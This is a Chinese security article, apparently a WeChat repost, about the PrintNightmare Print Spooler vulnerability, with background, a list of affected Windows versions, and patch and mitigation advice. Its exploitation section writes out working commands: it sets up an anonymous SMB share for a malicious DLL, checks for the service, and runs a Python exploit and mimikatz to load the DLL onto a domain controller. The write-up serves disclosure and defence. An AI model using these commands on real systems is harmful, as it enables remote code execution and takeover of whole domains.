> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/iciaX2AzlFoVicsysTS4xsBxK7nGibNYbud0Tf6VicDlTs588KmyM8NxqYFuDX59ck0ORExDtoWeSVDC9CMmnZpt2jw/640)

Windows Print Spooler 权限提升漏洞（PrintNightmare）

  

**目录**

一：漏洞概述

二：影响范围

三：漏洞利用

          漏洞过程  

         创建匿名 SMB 共享  

使用 python 脚本攻击

使用 mimikatz 攻击

四：漏洞防护

4.1 官方升级

4.2 临时防护措施

![](https://mmbiz.qpic.cn/mmbiz_gif/zibb4iaicdznzDBHw6juG8h2mltoSZY29HYr3M3VU05Z1V3ZxGfAB3uNHYs4ahQXkcYic9icnZ26VFIhibl0Anm9kib8Q/640)

**壹**

漏洞概述

       2021 年 6 月 9 日，微软发布 6 月安全更新补丁，修复了 50 个安全漏洞，其中包括一个 Windows Print Spooler 权限提升漏洞（CVE-2021-1675），该漏洞被标记为提权漏洞。普通用户可以利用此漏洞以管理员身份在运行打印后台处理程序服务的系统上执行代码。然而在 6 月 21 日，微软又将该漏洞升级为远程代码执行漏洞。

      2021 年 6 月 29 日，有安全研究员在 github 公布了打印机漏洞利用 exp。但是令人没想到的是，该漏洞利用 exp 针对的漏洞是一个与 CVE-2021-1675 类似但不完全相同的漏洞，并且微软针对该漏洞并没有推送更新补丁，所以也就意味着这是一个 0day 漏洞，这个 0day 漏洞被称为 PrintNightmare，最新的漏洞编号为 CVE-2021-34527。

    Print Spooler 是 Windows 系统中用于管理打印相关事务的服务，在 Windows 系统中用于后台执行打印作业并处理与打印机的交互，管理所有本地和网络打印队列及控制所有打印工作。该服务对应的进程 spoolsv.exe 以 SYSTEM 权限执行，其设计中存在的一个严重缺陷，由于 SeLoadDriverPrivilege 中鉴权存在代码缺陷，参数可以被攻击者控制，普通用户可以通过 RPC 触发 RpcAddPrinterDrive 绕过安全检查并写入恶意驱动程序。如果一个域中存在此漏洞，域中普通用户即可通过连接域控 Spooler 服务，向域控中添加恶意驱动，从而控制整个域环境。  

![](https://mmbiz.qpic.cn/mmbiz_gif/zibb4iaicdznzDBHw6juG8h2mltoSZY29HYr3M3VU05Z1V3ZxGfAB3uNHYs4ahQXkcYic9icnZ26VFIhibl0Anm9kib8Q/640)

**贰**

影响范围

  

受影响版本

- Windows Server 2012 R2 (Server Core installation)  
- Windows Server 2012 R2  
- Windows Server 2012 (Server Core installation)  
- Windows Server 2012  
- Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)  
- Windows Server 2008 R2 for x64-based Systems Service Pack 1  
- Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)  
- Windows Server 2008 for x64-based Systems Service Pack 2  
- Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)  
- Windows Server 2008 for 32-bit Systems Service Pack 2  
- Windows RT 8.1  
- Windows 8.1 for x64-based systems  
- Windows 8.1 for 32-bit systems  
- Windows 7 for x64-based Systems Service Pack 1  
- Windows 7 for 32-bit Systems Service Pack 1  
- Windows Server 2016 (Server Core installation)  
- Windows Server 2016  
- Windows 10 Version 1607 for x64-based Systems  
- Windows 10 Version 1607 for 32-bit Systems  
- Windows 10 for x64-based Systems  
- Windows 10 for 32-bit Systems  
- Windows Server, version 20H2 (Server Core Installation)  
- Windows 10 Version 20H2 for ARM64-based Systems  
- Windows 10 Version 20H2 for 32-bit Systems  
- Windows 10 Version 20H2 for x64-based Systems  
- Windows Server, version 2004 (Server Core installation)  
- Windows 10 Version 2004 for x64-based Systems  
- Windows 10 Version 2004 for ARM64-based Systems  
- Windows 10 Version 2004 for 32-bit Systems  
- Windows 10 Version 21H1 for 32-bit Systems  
- Windows 10 Version 21H1 for ARM64-based Systems  
- Windows 10 Version 21H1 for x64-based Systems  
- Windows 10 Version 1909 for ARM64-based Systems  
- Windows 10 Version 1909 for x64-based Systems  
- Windows 10 Version 1909 for 32-bit Systems  
- Windows Server 2019 (Server Core installation)  
- Windows Server 2019  
- Windows 10 Version 1809 for ARM64-based Systems  
- Windows 10 Version 1809 for x64-based Systems  
- Windows 10 Version 1809 for 32-bit Systems

![](https://mmbiz.qpic.cn/mmbiz_gif/zibb4iaicdznzDBHw6juG8h2mltoSZY29HYr3M3VU05Z1V3ZxGfAB3uNHYs4ahQXkcYic9icnZ26VFIhibl0Anm9kib8Q/640)

**叁**

漏洞利用

  

**漏洞过程**

1：首先我们搭建一个 SMB 匿名共享，放我们的恶意 dll 文件。  
2：然后执行利用工具，工具运行后会先检测 C:\Windows\System32\DriverStore\FileRepository 目录下 ntprint.inf_amd64_xx 文件名，自动替换。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cvBYd6PeAZmHLs8ey3Rw3nTeObSXenuRWwpkFybSftou9SRzTh7nJBt3yDUcomniaic1TiaRqib7ib1AA/640)

*   然后远程拉取我们设置的匿名共享的恶意 dll 文件
    
*   py 脚本会将我们的恶意 dll 文件传到域控的 C:\Windows\System32\spool\drivers\x64\3\ 目录下并执行。  
    而 mimikatz 则是将我们的恶意 dll 文件传到域控的 C:\Windows\System32\spool\drivers\x64\old\2\ 目录下并执行 (会创建 old\2 \ 目录)。
    

**检测是否存在漏洞**

先检测目标机器是否开启 MS-RPRN 服务，存在即可以尝试利用：

python3 rpcdump.py @10.211.55.14 | grep MS-RPRN

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cvBYd6PeAZmHLs8ey3Rw3nic11FcBNlH3jlUXd9ayRSt1DADia3pdeLicOVT0LVXkkfdKC9ibbVtUgLA/640)

### 创建匿名 SMB 共享

```
mkdir C:\share
icacls C:\share\ /T /grant "ANONYMOUS LOGON":r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
执行完以上语句后，部分机器需要重启
```

**使用 python 脚本攻击**  

```
python3 CVE-2021-1675.py xie.com/test:P@ss1234@10.211.55.14 '\\10.211.55.7\share\1.dll'
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cvBYd6PeAZmHLs8ey3Rw3nFDIc9kRTSEE3gcgEPcxn4SiakzOP4lyNicSicU929TJqrQLBHbIH4HBHg/640)

**使用 mimikatz 攻击**

```
mimikatz.exe
misc::printnightmare /server:10.211.55.14 /library:\\10.211.55.7\share\1.dll
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cvBYd6PeAZmHLs8ey3Rw3nDtLpdEVZn6EGZ44rBzAgC3rMA70Etlicyl4mx9jr197KYX2VxebkicHg/640)

实战测试攻击 Windows Server2016、2019 均能成功上线。Server2012 只能上传恶意 dll，不能执行上线，08 未攻击成功。

![](https://mmbiz.qpic.cn/mmbiz_gif/zibb4iaicdznzDBHw6juG8h2mltoSZY29HYr3M3VU05Z1V3ZxGfAB3uNHYs4ahQXkcYic9icnZ26VFIhibl0Anm9kib8Q/640)

**肆**

漏洞防护

  

4.1

官方升级

目前微软官方已针对支持的系统版本发布了修复该漏洞的安全补丁，强烈建议受影响用户尽快安装补丁进行防护，官方下载链接：  
https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675  
注：由于网络问题、计算机环境问题等原因，Windows Update 的补丁更新可能出现失败。用户在安装补丁后，应及时检查补丁是否成功更新。  
右键点击 Windows 图标，选择 “设置(N)”，选择“更新和安全”-“Windows 更新”，查看该页面上的提示信息，也可点击“查看更新历史记录” 查看历史更新情况。  
针对未成功安装的更新，可点击更新名称跳转到微软官方下载页面，建议用户点击该页面上的链接，转到 “Microsoft 更新目录” 网站下载独立程序包并安装。

4.2

临时防护措施

若相关用户暂时无法进行补丁更新，可通过禁用 Print Spooler 服务来进行缓解：  
一：在服务应用（services.msc）中找到 Print Spooler 服务。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fZde99sicNvkmkH1WNSic1MRIUzhiakrc9wKyib4mDxmcJfq240zXpKhbSUyNxibib1voQnojd3GKibaE3w/640?wx_fmt=png)

二：停止运行服务，同时将 “启动类型” 修改为“禁用”。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fZde99sicNvkmkH1WNSic1MRp6SBiaPibtY0ARmxUrsX2ln1BYOauiaAsRyAMnwasC0sITUQRI8jkG30A/640?wx_fmt=png)

参考：

http://blog.nsfocus.net/windows-print-spoolercve/

https://github.com/hhlxf/PrintNightmare

https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2021-1675

[https://mp.weixin.qq.com/s/fVzaBhHbI6QTlnvnK0nMug](https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247486906&idx=1&sn=2781e972a16ef28ce3c6417e9c2cf075&scene=21#wechat_redirect)